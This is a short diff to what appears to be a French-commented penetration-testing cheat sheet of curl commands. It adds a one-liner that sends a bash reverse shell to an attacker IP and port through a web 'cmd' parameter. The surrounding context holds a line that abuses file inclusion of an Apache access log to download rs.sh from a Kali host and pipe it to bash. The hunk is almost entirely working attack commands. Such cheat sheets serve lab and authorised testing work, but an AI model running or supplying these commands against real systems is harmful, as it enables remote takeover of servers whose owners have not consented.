@@ -136,6 +136,8 @@ curl -s -X POST http://TARGET/upload.php \
 # ─────────────────────────────────────────
 # REVERSE SHELL VIA CURL
 # ─────────────────────────────────────────
+# Exécuter un reverseshell
+curl -G --data-urlencode 'cmd=bash -c "bash -i >& /dev/tcp/<IP_ATTACK>/<PORT> 0>&1"' http://<IP>/<RESSOURCE>/<FILE>
 
 # Télécharger et exécuter un script
 curl -s "http://TARGET/index.php?page=/var/log/apache2/access.log&cmd=curl+http://KALI_IP/rs.sh|bash"
